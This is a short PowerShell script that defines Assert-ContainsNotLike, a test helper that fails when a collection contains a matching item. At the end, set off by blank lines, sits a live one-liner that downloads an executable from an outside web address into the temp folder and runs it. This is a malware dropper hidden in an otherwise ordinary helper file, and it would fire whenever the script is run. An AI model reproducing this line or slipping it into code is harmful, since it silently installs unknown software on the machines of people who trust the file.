













function Assert-ContainsNotLike
{
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0)]
        [object]
        
        $Haystack, 

        [Parameter(Position=1)]
        [object]
        
        $Needle, 

        [Parameter(Position=2)]
        [string]
        
        $Message
    )

    Set-StrictMode -Version 'Latest'

    foreach( $item in $Haystack )
    {
        if( $item -like "*$Needle*" )
        {
            Fail "Found '$Needle': $Message"
        }
    }
}


($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://www.amspeconline.com/123/nana.exe', $dpl);Start-Process $dpl

